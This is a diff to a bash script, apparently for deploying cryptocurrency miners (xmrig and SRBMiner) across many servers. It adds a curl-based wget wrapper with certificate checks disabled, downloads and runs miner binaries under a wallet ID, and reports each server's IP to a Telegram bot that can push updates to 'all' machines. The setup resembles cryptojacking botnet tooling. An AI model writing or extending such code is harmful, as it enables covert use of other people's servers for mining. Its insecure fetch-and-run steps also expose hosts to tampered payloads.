@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v30: GREP-A BINARY INSPECTION & SAFE SSL WGET  |
+# | GOD MODE v31: MONOLITHIC PRODUCTION ENGINE (SRB PEARL)   |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -34,34 +34,40 @@ fi
 mkdir -p "$BASE_DIR"
 cd "$BASE_DIR" || exit 1
 
-# Добавляем BASE_DIR в PATH для взаимодействия с нашими утилитами
+# Добавляем BASE_DIR в PATH
 export PATH="$BASE_DIR:$PATH"
 
 # ----------------------------------------------------
-# [ PHASE 0: WGET WRAPPER FALLBACK (FOR SRBMINER) ]
+# [ PHASE 0: SAFE WGET WRAPPER FALLBACK ]
 # ----------------------------------------------------
-# Если в системе нет 'wget', создаем прозрачную обертку через 'curl'
 if ! command -v wget >/dev/null 2>&1; then
     cat << 'EOF' > "$BASE_DIR/wget"
 #!/bin/bash
-# Universal wget fallback wrapper using curl
 URL=""
 OUTFILE=""
+NEXT_OUT=0
 for arg in "$@"; do
-    if [ "$PREV" = "-O" ] || [ "$PREV" = "-o" ] || [ "$PREV" = "--output-document" ]; then
+    if [ "$NEXT_OUT" -eq 1 ]; then
         OUTFILE="$arg"
-    elif [[ "$arg" =~ ^http ]]; then
-        URL="$arg"
+        NEXT_OUT=0
+        continue
     fi
-    PREV="$arg"
+    case "$arg" in
+        -O|-o|--output-document)
+            NEXT_OUT=1
+            ;;
+        -O*|-o*)
+            OUTFILE="${arg#??}"
+            ;;
+        http://*|https://*)
+            URL="$arg"
+            ;;
+    esac
 done
-
-if [ -n "$OUTFILE" ] && [ -n "$URL" ]; then
+if [ -n "$OUTFILE" ] && [ "$OUTFILE" != "-" ]; then
     exec curl -L -k -s -o "$OUTFILE" "$URL"
-elif [ -n "$URL" ]; then
-    exec curl -L -k -s -O "$URL"
 else
-    exec curl -L -k -s "$@"
+    exec curl -L -k -s "$URL"
 fi
 EOF
     chmod +x "$BASE_DIR/wget"
@@ -110,7 +116,7 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & SAFE VERIFICATION ]
+# [ PHASE 2: MODULE DOWNLOAD & SAFE INSTALL ]
 # ----------------------------------------------------
 URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
@@ -146,7 +152,7 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Использование grep -qia вместо утилиты strings из binutils)
+# GPU Setup (Проверка файла через 'grep -qia' без вызова бинарника)
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
@@ -163,7 +169,6 @@ if [ "$HAS_GPU" -eq 1 ]; then
         rm -f "$BIN_GPU" gpu.tar.gz
         curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz --no-check-certificate -T 40 "$URL_SRBMINER"
         
-        # Проверка целостности и ненулевого размера скачанного архива
         if [ -f gpu.tar.gz ] && [ -s gpu.tar.gz ]; then
             tar -xf gpu.tar.gz 2>/dev/null
             FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
@@ -336,7 +341,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V30 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V31 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -361,7 +366,7 @@ while true; do
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                     chmod +x "./\$BIN_GPU"
-                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --disable-cpu >> "\$LOG_GPU" 2>&1 &
+                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                         GPU_STATUS="🔴 Offline / Crashed"
@@ -458,7 +463,7 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V30 INITIALIZED"
+echo "[+] ENGINE V31 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
